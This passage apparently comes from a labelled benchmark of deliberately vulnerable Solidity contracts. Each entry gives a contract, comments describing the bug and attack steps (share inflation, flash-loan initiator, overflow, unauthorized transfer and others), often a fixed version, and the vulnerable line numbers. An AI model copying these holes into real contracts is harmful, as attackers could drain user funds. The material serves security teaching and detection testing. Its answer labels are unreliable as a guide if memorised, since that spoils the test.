6004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029""
            )
        );
    }
    constructor(address nftAddress) {
        token = ERC777(nftAddress);
        // Register IERC1820Registry
        IERC1820Registry registry = IERC1820Registry(
            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
        );
        registry.setInterfaceImplementer(
            address(this),
            _TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }
    function claim(address account, uint256 amount) public returns (bool) {
        // Check if total claims for the address would exceed max mints per address.
        require(
            _mints[account] + amount <= maxMintsPerAddress,
            ""Exceeds max mints per address""
        );
        token.transfer(account, amount);
        _mints[account] += amount; // Do not follow check-effect-interaction
        return true;
    }
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) external {}
    receive() external payable {}
}","[66, 67]"
"        _totalSupply = _totalSupply.sub(tokensToBurn);
        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        emit Transfer(from, to, tokensToTransfer);
        emit Transfer(from, address(0), tokensToBurn);
        return true;
    }
    function upAllowance(
        address spender,
        uint256 addedValue
    ) public returns (bool) {
        require(spender != address(0));
        _allowed[msg.sender][spender] = (
            _allowed[msg.sender][spender].add(addedValue)
        );
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }
    function downAllowance(
        address spender,
        uint256 subtractedValue
    ) public returns (bool) {
        require(spender != address(0));
        _allowed[msg.sender][spender] = (
            _allowed[msg.sender][spender].sub(subtractedValue)
        );
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }
    function _issue(address account, uint256 amount) internal {
        require(amount != 0);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function destroy(uint256 amount) external {
        _destroy(msg.sender, amount);
    }
    function _destroy(address account, uint256 amount) internal {
        require(amount != 0);
        require(amount <= _balances[account]);
        _totalSupply = _totalSupply.sub(amount);
        _balances[account] = _balances[account].sub(amount);
        emit Transfer(account, address(0), amount);
    }
    function destroyFrom(address account, uint256 amount) external {
        require(amount <= _allowed[account][msg.sender]);
        _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(
            amount
        );
        _destroy(account, amount);
    }
}
//vulnerable vault
contract VulnVault {
    mapping(address => uint256) private balances;
    uint256 private fee;
    IERC20 private token;
    event Deposit(address indexed depositor, uint256 amount);
    event Withdrawal(address indexed recipient, uint256 amount);
    constructor(address _tokenAddress) {
        token = IERC20(_tokenAddress);
    }
    function deposit(uint256 amount) external {
        require(amount > 0, ""Deposit amount must be greater than zero"");
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
        emit Deposit(msg.sender, amount);
    }
    function withdraw(uint256 amount) external {
        require(amount > 0, ""Withdrawal amount must be greater than zero"");
        require(amount <= balances[msg.sender], ""Insufficient balance"");
        balances[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
        emit Withdrawal(msg.sender, amount);
    }
    function getBalance(address account) external view returns (uint256) {
        return balances[account];
    }
}
//Mitigated vault
contract Vault {
    mapping(address => uint256) private balances;
    uint256 private fee;
    IERC20 private token;
    event Deposit(address indexed depositor, uint256 amount);
    event Withdrawal(address indexed recipient, uint256 amount);
    constructor(address _tokenAddress) {
        token = IERC20(_tokenAddress);
    }
    function deposit(uint256 amount) external {
        require(amount > 0, ""Deposit amount must be greater than zero"");
        uint256 balanceBefore = token.balanceOf(address(this));
        token.transferFrom(msg.sender, address(this), amount);
        uint256 balanceAfter = token.balanceOf(address(this));
        uint256 actualDepositAmount = balanceAfter - balanceBefore;
        balances[msg.sender] += actualDepositAmount;
        emit Deposit(msg.sender, actualDepositAmount);
    }
    function withdraw(uint256 amount) external {
        require(amount > 0, ""Withdrawal amount must be greater than zero"");
        require(amount <= balances[msg.sender], ""Insufficient balance"");
        balances[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
        emit Withdrawal(msg.sender, amount);
    }
    function getBalance(address account) external view returns (uint256) {
        return balances[account];
    }
}","[64, 65]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
import ""@openzeppelin/contracts/access/Ownable.sol"";
/*
Name: First deposit bug
Description:
First pool depositor can be front-run and have part of their deposit stolen
In this case, we can control the variable ""_supplied."" 
By depositing a small amount of loan tokens to obtain pool tokens, 
we can front-run other depositors' transactions and inflate the price of pool tokens through a substantial ""donation.""
Consequently, the attacker can withdraw a greater quantity of loan tokens than they initially possessed.
This calculation issue arises because, in Solidity, if the pool token value for a user becomes less than 1,
it is essentially rounded down to 0.
Mitigation:  
Consider minting a minimal amount of pool tokens during the first deposit 
and sending them to zero address, this increases the cost of the attack. 
Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address. 
The same can be done in this case i.e. when totalSupply() == 0, 
send the first min liquidity LP tokens to the zero address to enable share dilution.
REF:
https://defihacklabs.substack.com/p/solidity-security-lesson-2-first
https://github.com/sherlock-audit/2023-02-surge-judging/issues/1
https://github.com/transmissions11/solmate/issues/178
*/
/*
 * @vulnerable_at_lines: 67, 88
 */
contract MyToken is ERC20, Ownable {
    constructor() ERC20(""MyToken"", ""MTK"") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }
    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
contract SimplePool {
    IERC20 public loanToken;
    uint public totalShares;
    mapping(address => uint) public balanceOf;
    constructor(address _loanToken) {
        loanToken = IERC20(_loanToken);
    }
    function deposit(uint amount) external {
        require(amount > 0, ""Amount must be greater than zero"");
        uint _shares;
        if (totalShares == 0) {
            _shares = amount;
        } else {
            _shares = tokenToShares(
                amount,
                loanToken.balanceOf(address(this)),
                totalShares,
                false
            );
        }
        require(
            loanToken.transferFrom(msg.sender, address(this), amount),
            ""TransferFrom failed""
        );
        balanceOf[msg.sender] += _shares;
        totalShares += _shares;
    }
    function tokenToShares(
        uint _tokenAmount,
        uint _supplied,
        uint _sharesTotalSupply,
        bool roundUpCheck
    ) internal pure returns (uint) {
        if (_supplied == 0) return _tokenAmount;
        uint shares = (_tokenAmount * _sharesTotalSupply) / _supplied;
        if (
            roundUpCheck &&
            shares * _supplied < _tokenAmount * _sharesTotalSupply
        ) shares++;
        return shares;
    }
    function withdraw(uint shares) external {
        require(shares > 0, ""Shares must be greater than zero"");
        require(balanceOf[msg.sender] >= shares, ""Insufficient balance"");
        uint tokenAmount = (shares * loanToken.balanceOf(address(this))) /
            totalShares;
        balanceOf[msg.sender] -= shares;
        totalShares -= shares;
        require(loanToken.transfer(msg.sender, tokenAmount), ""Transfer failed"");
    }
}","[52, 71]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
import ""@openzeppelin/contracts/access/Ownable.sol"";
import ""@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol"";
/*
Name: Missing flash loan initiator check
Description:
Missing flash loan initiator check refers to a potential security vulnerability in a flash loan implementation 
where the initiator of the flash loan is not properly verified or checked, anyone could exploit the flash loan 
functionality and set the receiver address to a vulnerable protocol.
By doing so, an attacker could potentially manipulate balances, open trades, drain funds, 
or carry out other malicious actions within the vulnerable protocol. 
This poses significant risks to the security and integrity of the protocol and its users.
Mitigation:  
Check the initiator of the flash loan and revert if the initiator is not authorized.
REF:
https://twitter.com/ret2basic/status/1681150722434551809
https://github.com/sherlock-audit/2023-05-dodo-judging/issues/34
*/
/*
 * @vulnerable_at_lines: 64, 139
 */
contract SimpleBankBug {
    using SafeERC20 for IERC20;
    IERC20 public USDa;
    LendingPool public lendingPool;
    constructor(address _lendingPoolAddress, address _asset) {
        lendingPool = LendingPool(_lendingPoolAddress);
        USDa = IERC20(_asset);
    }
    function flashLoan(
        uint256 amounts,
        address receiverAddress,
        bytes calldata data
    ) external {
        receiverAddress = address(this);
        lendingPool.flashLoan(amounts, receiverAddress, data);
    }
    function executeOperation(
        uint256 amounts,
        address receiverAddress,
        address _initiator,
        bytes calldata data
    ) external {
        /* Perform your desired logic here
        Open opsition, close opsition, drain funds, etc.
        _closetrade(...) or _opentrade(...)
        */
        // transfer all borrowed assets back to the lending pool
        IERC20(USDa).safeTransfer(address(lendingPool), amounts);
    }
}
contract FixedSimpleBank {
    using SafeERC20 for IERC20;
    IERC20 public USDa;
    LendingPool public lendingPool;
    constructor(address _lendingPoolAddress, address _asset) {
        lendingPool = LendingPool(_lendingPoolAddress);
        USDa = IERC20(_asset);
    }
    function flashLoan(
        uint256 amounts,
        address receiverAddress,
        bytes calldata data
    ) external {
        address receiverAddress = address(this);
        lendingPool.flashLoan(amounts, receiverAddress, data);
    }
    function executeOperation(
        uint256 amounts,
        address receiverAddress,
        address _initiator,
        bytes calldata data
    ) external {
        // Mitigation: make sure to check the initiator
        require(_initiator == address(this), ""Unauthorized"");
        // transfer all borrowed assets back to the lending pool
        IERC20(USDa).safeTransfer(address(lendingPool), amounts);
    }
}
contract USDa is ERC20, Ownable {
    constructor() ERC20(""USDA"", ""USDA"") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }
    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
interface IFlashLoanReceiver {
    function executeOperation(
        uint256 amounts,
        address receiverAddress,
        address _initiator,
        bytes calldata data
    ) external;
}
contract LendingPool {
    IERC20 public USDa;
    constructor(address _USDA) {
        USDa = IERC20(_USDA);
    }
    function flashLoan(
        uint256 amount,
        address borrower,
        bytes calldata data
    ) public {
        uint256 balanceBefore = USDa.balanceOf(address(this));
        require(balanceBefore >= amount, ""Not enough liquidity"");
        require(USDa.transfer(borrower, amount), ""Flashloan transfer failed"");
        IFlashLoanReceiver(borrower).executeOperation(
            amount,
            borrower,
            msg.sender,
            data
        );
        uint256 balanceAfter = USDa.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, ""Flashloan not repaid"");
    }
}","[51, 114]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
Name: txGasPrice manipulation
Description:
Manipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.
In the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. 
The issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.
Mitigation:  
To address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source. 
Test:
forge test --contracts src/test/gas-price.sol  -vvvv --gas-price 200000000000000
REF:
https://twitter.com/1nf0s3cpt/status/1678268482641870849
https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-21-Alligator.md
https://github.com/solodit/solodit_content/blob/main/reports/Trust%20Security/2023-05-15-Brahma.md
https://blog.pessimistic.io/ethereum-alarm-clock-exploit-final-thoughts-21334987c331
*/
/*
 * @vulnerable_at_lines: 37
 */
contract GasReimbursement {
    uint public gasUsed = 100000; // Assume gas used is 100,000
    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500
    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei
    function calculateTotalFee() public view returns (uint) {
        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;
        return totalFee;
    }
    function executeTransfer(address recipient) public {
        uint256 totalFee = calculateTotalFee();
        _nativeTransferExec(recipient, totalFee);
    }
    function _nativeTransferExec(address recipient, uint256 amount) internal {
        payable(recipient).transfer(amount);
    }
}",[27]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
/*
Name: abi.encodePacked() Hash Collisions
Description:
Using abi.encodePacked() with multiple variable length arguments can, 
in certain situations, lead to a hash collision.
Hash functions are designed to be unique for each input, 
but collisions can still occur due to limitations in the hash function's size or the sheer number of possible inputs. 
This is a known issue mentioned:
https://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode
In deposit function allows users to deposit Ether into the contract based on two string inputs: _string1 and _string2. 
The contract uses the keccak256 function to generate a unique hash by concatenating these two strings.
If two different combinations of _string1 and _string2 produce the same hash value, a hash collision will occur. 
The code does not handle this scenario properly and allows the second depositor to overwrite the previous deposit.
Mitigation: 
use of abi.encode() instead of abi.encodePacked()
REF:
https://twitter.com/1nf0s3cpt/status/1676476475191750656
https://docs.soliditylang.org/en/v0.8.17/abi-spec.html?highlight=collisions#non-standard-packed-mode
https://swcregistry.io/docs/SWC-133
https://github.com/sherlock-audit/2022-10-nftport-judging/issues/118
*/
/*
 * @vulnerable_at_lines: 43, 56
 */
contract HashCollisionBug {
    mapping(bytes32 => uint256) public balances;
    function createHash(
        string memory _string1,
        string memory _string2
    ) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(_string1, _string2));
    }
    function deposit(
        string memory _string1,
        string memory _string2
    ) external payable {
        require(msg.value > 0, ""Deposit amount must be greater than zero"");
        bytes32 hash = createHash(_string1, _string2);
        // createHash(AAA, BBB) -> AAABBB
        // createHash(AA, ABBB) -> AAABBB
        // Check if the hash already exists in the balances mapping
        require(balances[hash] == 0, ""Hash collision detected"");
        balances[hash] = msg.value;
    }
}","[33, 44]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC721/ERC721.sol"";
import ""@openzeppelin/contracts/access/Ownable.sol"";
import ""@openzeppelin/contracts/utils/Counters.sol"";
// Immunefi #spotthebugchallenge!
// https://twitter.com/immunefi/status/1557301712549023745
/*
 * @vulnerable_at_lines: 32, 33
 */
contract HerToken is ERC721, Ownable, Test {
    uint128 constant MINT_PRICE = 1 ether;
    uint128 constant MAX_SUPPLY = 10000;
    uint mintIndex;
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIdCounter;
    constructor() payable ERC721(""HarToken"", ""HRT"") {}
    function safeMint(address to, uint256 amount) public payable {
        require(
            _tokenIdCounter.current() + amount < MAX_SUPPLY,
            ""Cannot mint given amount.""
        );
        require(amount > 0, ""Must give a mint amount."");
        //fix require(msg.value >= MINT_PRICE * amount, ""Insufficient Ether."");
        // before the loop
        for (uint256 i = 0; i < amount; i++) {
            require(msg.value >= MINT_PRICE, ""Insufficient Ether."");
            mintIndex = _tokenIdCounter.current();
            console.log(""mintIndex"", mintIndex);
            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.
            _tokenIdCounter.increment();
        }
    }
    function safeMintMitigated(address to, uint256 amount) public payable {
        require(
            _tokenIdCounter.current() + amount < MAX_SUPPLY,
            ""Cannot mint given amount.""
        );
        require(amount > 0, ""Must give a mint amount."");
        //fix require(msg.value >= MINT_PRICE * amount, ""Insufficient Ether."");
        // before the loop
        require(msg.value >= MINT_PRICE * amount, ""Insufficient Ether."");
        for (uint256 i = 0; i < amount; i++) {
            //require(msg.value >= MINT_PRICE, ""Insufficient Ether."");
            mintIndex = _tokenIdCounter.current();
            console.log(""mintIndex"", mintIndex);
            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.
            _tokenIdCounter.increment();
        }
    }
}","[26, 27]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/utils/Address.sol"";
import ""@openzeppelin/contracts/utils/StorageSlot.sol"";
import ""@openzeppelin/contracts/access/Ownable.sol"";
import ""@openzeppelin/contracts/proxy/utils/Initializable.sol"";
//#SpotTheBugChallenge
//https://twitter.com/immunefi/status/1562858386244665348?s=21&t=d7_HtNra5AGuNmzVtv9uKg
/*
 * @vulnerable_at_lines: 22
 */
interface imp {
    function initialize(address) external;
}
contract Proxy {
    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(""where.bug.ser"");  //correct pattern.
    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(""where.bug.ser""); // wrong
    constructor(address implementation) {
        _setImplementation(address(0));
        Address.functionDelegateCall(
            implementation,
            abi.encodeWithSignature(""initialize(address)"", msg.sender)
        );
    }
    fallback() external payable {
        address implementation = _getImplementation();
        Address.functionDelegateCall(implementation, msg.data);
    }
    function _setImplementation(address newImplementation) private {
        //require(Address.isContract(newImplementation), ""ERC1967: new implementation is not a contract"");
        StorageSlot
            .getAddressSlot(_IMPLEMENTATION_SLOT)
            .value = newImplementation;
    }
    function _getImplementation() public view returns (address) {
        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
    }
}
contract ProxyMitigated {
    bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(""where.bug.ser"");  //correct pattern.
    //bytes32 internal _IMPLEMENTATION_SLOT = keccak256(""where.bug.ser""); // wrong
    constructor(address implementation) {
        _setImplementation(address(0));
        Address.functionDelegateCall(
            implementation,
            abi.encodeWithSignature(""initialize(address)"", msg.sender)
        );
    }
    fallback() external payable {
        address implementation = _getImplementation();
        Address.functionDelegateCall(implementation, msg.data);
    }
    function _setImplementation(address newImplementation) private {
        //require(Address.isContract(newImplementation), ""ERC1967: new implementation is not a contract"");
        StorageSlot
            .getAddressSlot(_IMPLEMENTATION_SLOT)
            .value = newImplementation;
    }
    function _getImplementation() public view returns (address) {
        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
    }
}
contract Implementation is Ownable, Initializable {
    // function initialize(address owner) external {    //test purpose
    function initialize(address owner) external initializer {
        _transferOwnership(owner);
    }
}",[17]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC20/ERC20.sol"";
import ""@openzeppelin/contracts/access/Ownable.sol"";
/*
Name: Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse 
Description:
The bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. 
This allows tokens to be unlocked multiple times before the lock period has elapsed, 
potentially leading to significant financial loss.
Mitigation:  
Add a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.
or fix:
uint256 amount = locker.amount;
if (block.timestamp > locker.lockTime) {
    IERC20(locker.tokenAddress).transfer(msg.sender, amount);
    locker.amount = 0;
    }
REF:
https://twitter.com/1nf0s3cpt/status/1681492477281468420
https://blog.decurity.io/dx-protocol-vulnerability-disclosure-bddff88aeb1d
*/
/*
 * @vulnerable_at_lines: 77, 78, 79
 */
contract VulnerableBank {
    struct Locker {
        bool hasLockedTokens;
        uint256 amount;
        uint256 lockTime;
        address tokenAddress;
    }
    mapping(address => mapping(uint256 => Locker)) private _unlockToken;
    uint256 private _nextLockerId = 1;
    function createLocker(
        address tokenAddress,
        uint256 amount,
        uint256 lockTime
    ) public {
        require(amount > 0, ""Amount must be greater than 0"");
        require(lockTime > block.timestamp, ""Lock time must be in the future"");
        require(
            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,
            ""Insufficient token balance""
        );
        // Transfer the tokens to this contract
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
        // Create the locker
        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
        locker.hasLockedTokens = true;
        locker.amount = amount;
        locker.lockTime = lockTime;
        locker.tokenAddress = tokenAddress;
        _nextLockerId++;
    }
    function unlockToken(uint256 lockerId) public {
        Locker storage locker = _unlockToken[msg.sender][lockerId];
        // Save the amount to a local variable
        uint256 amount = locker.amount;
        require(locker.hasLockedTokens, ""No locked tokens"");
        // Incorrect sanity checks.
        if (block.timestamp > locker.lockTime) {
            locker.amount = 0;
        }
        // Transfer tokens to the locker owner
        // This is where the exploit happens, as this can be called multiple times
        // before the lock time has elapsed.
        IERC20(locker.tokenAddress).transfer(msg.sender, amount);
    }
}
contract BanksLP is ERC20, Ownable {
    constructor() ERC20(""BanksLP"", ""BanksLP"") {
        _mint(msg.sender, 10000 * 10 ** decimals());
    }
    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
contract FixedeBank {
    struct Locker {
        bool hasLockedTokens;
        uint256 amount;
        uint256 lockTime;
        address tokenAddress;
    }
    mapping(address => mapping(uint256 => Locker)) private _unlockToken;
    uint256 private _nextLockerId = 1;
    function createLocker(
        address tokenAddress,
        uint256 amount,
        uint256 lockTime
    ) public {
        require(amount > 0, ""Amount must be greater than 0"");
        require(lockTime > block.timestamp, ""Lock time must be in the future"");
        require(
            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,
            ""Insufficient token balance""
        );
        // Transfer the tokens to this contract
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
        // Create the locker
        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
        locker.hasLockedTokens = true;
        locker.amount = amount;
        locker.lockTime = lockTime;
        locker.tokenAddress = tokenAddress;
        _nextLockerId++;
    }
    function unlockToken(uint256 lockerId) public {
        Locker storage locker = _unlockToken[msg.sender][lockerId];
        require(locker.hasLockedTokens, ""No locked tokens"");
        require(block.timestamp > locker.lockTime, ""Tokens are still locked"");
        // Save the amount to a local variable
        uint256 amount = locker.amount;
        // Mark the tokens as unlocked
        locker.hasLockedTokens = false;
        locker.amount = 0;
        // Transfer tokens to the locker owner
        IERC20(locker.tokenAddress).transfer(msg.sender, amount);
    }
}","[62, 63, 64]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow
/*
Name: Invariant issue
Description:
Assert is used to check invariants. Those are states our contract or variables should never reach, ever. For example,
if we decrease a value then it should never get bigger, only smaller.
In the given code, the Invariant contract contains a receiveMoney function that accepts Ether and 
increments the sender's balance with the amount received. This balance is stored as an uint64.
Unsigned integers can store values from 0 to 2^n - 1, so in this case 2^64 - 1, or roughly 18.4467 Ether.
If the sender sends more Ether than the maximum that can be stored in an uint64, 
an overflow occurs, and the value rolls over to 0 and starts incrementing from there. 
As a result, the balance does not accurately reflect the amount of Ether received by the contract.
Mitigation:
To avoid this problem, it's important to ensure that the types you use for storing values 
are appropriately sized for the values they need to store.
REF:
https://ethereum-blockchain-developer.com/027-exceptions/04-invariants-with-assert/
*/
/*
 * @vulnerable_at_lines: 37
 */
contract Invariant {
    mapping(address => uint64) public balanceReceived;
    function receiveMoney() public payable {
        balanceReceived[msg.sender] += uint64(msg.value);
    }
    function withdrawMoney(address payable _to, uint64 _amount) public {
        require(
            _amount <= balanceReceived[msg.sender],
            ""Not Enough Funds, aborting""
        );
        balanceReceived[msg.sender] -= _amount;
        _to.transfer(_amount);
    }
}",[27]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import ""@openzeppelin/contracts/token/ERC721/ERC721.sol"";
import ""@openzeppelin/contracts/access/Ownable.sol"";
/*
Name: Unauthorized NFT Transfer in custom ERC721 implementation.
Description:
Custom transferFrom function in contract VulnerableERC721, 
does not properly check if msg.sender is the current owner of the token or an approved address.
As a result, any address can call the transferFrom function to transfer any token, 
regardless of who the current owner is. 
This allows unauthorized users to transfer tokens they do not own, leading to potential theft of assets.
Mitigation:  
To ensure that msg.sender is the current owner of the token or an approved address.
REF:
https://twitter.com/1nf0s3cpt/status/1679120390281412609
https://blog.decurity.io/scanning-for-vulnerable-erc721-implementations-fe19200b91b5
https://ventral.digital/posts/2022/8/18/sznsdaos-bountyboard-unauthorized-transferfrom-vulnerability
https://github.com/pessimistic-io/slitherin/blob/master/docs/nft_approve_warning.md
*/
/*
 * @vulnerable_at_lines: 42, 36
 */
contract VulnerableERC721 is ERC721, Ownable {
    constructor() ERC721(""MyNFT"", ""MNFT"") {}
    //custom transferFrom function which missing NFT owner check.
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public override {
        // direct transfer
        _transfer(from, to, tokenId);
    }
    function safeMint(address to, uint256 tokenId) public onlyOwner {
        _safeMint(to, tokenId);
    }
}
contract FixedERC721 is ERC721, Ownable {
    constructor() ERC721(""MyNFT"", ""MNFT"") {}
    //Mitigation: add token owner check
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public override {
        require(
            _isApprovedOrOwner(_msgSender(), tokenId),
            ""ERC721: caller is not token owner or approved""
        );
        _transfer(from, to, tokenId);
    }
    function safeMint(address to, uint256 tokenId) public onlyOwner {
        _safeMint(to, tokenId);
    }
    /*
    function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) {
        address owner = ERC721.ownerOf(tokenId);
        return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);
    }
*/
}","[27, 33]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow
/*
Name: Integrate Overflow   
Description:
The TimeLock has a flaw in the smart contract code that allows 
an attacker to prematurely withdraw their deposited funds from the TimeLock contract. 
The vulnerability arises due to an overflow in the increaseLockTime function, 
which manipulates the lock time in a way that causes it to wrap around to 0, 
enabling the attacker to withdraw their funds before the actual waiting period expires.
This contract is designed to act as a time vault.
User can deposit into this contract but cannot withdraw for atleast a week.
User can also extend the wait time beyond the 1 week waiting period.
/*
1. Alice and bob both have 1 Ether balance
2. Deploy TimeLock Contract
3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
4. Bob caused an overflow on his lockTime
5, Alice can't withdraw 1 Ether, because the lock time not expired.
6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0
What happened?
Attack caused the TimeLock.lockTime to overflow,
and was able to withdraw before the 1 week waiting period.
Impact: Solidity < 0.8 and without SafeMath 
Mitigation:
To mitigate the Overflow vulnerability, use SafeMath library or use Solidity > 0.8
*/
/*
 * @vulnerable_at_lines: 51
 */
contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }
    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // vulnerable
    }
    function withdraw() public {
        require(balances[msg.sender] > 0, ""Insufficient funds"");
        require(
            block.timestamp > lockTime[msg.sender],
            ""Lock time not expired""
        );
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("""");
        require(sent, ""Failed to send Ether"");
    }
}",[40]
"// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow
/*
Name: Token Whale Overflow Vulnerability
Description:
This contract demonstrates an integer underflow vulnerability in an ERC20 token contract. 
The vulnerability exists in the implementation of the transferFrom function. Due to the lack 
of automatic overflow checking in Solidity versions before 0.8.0, attackers can exploit 
this vulnerability to generate a large amount of tokens.
How it works:
1. Contract initializes with deployer receiving 1000 tokens
2. Deployer transfers 800 tokens to Alice
3. Alice approves the attacker to spend 1000 tokens
4. Attacker uses transferFrom to transfer 500 tokens from Alice to Bob
5. Due to the lack of overflow checking in the _transfer function's subtraction operation, 
   an underflow occurs when Alice's balance is insufficient
6. The underflow causes Alice's balance to become an extremely large number, 
   effectively creating tokens out of thin air
Impact: 
- Affects contracts using Solidity < 0.8.0
- Contracts not using SafeMath library
Mitigation:
1. Use Solidity 0.8.0 or later which has built-in overflow checking
2. Use SafeMath library for older versions
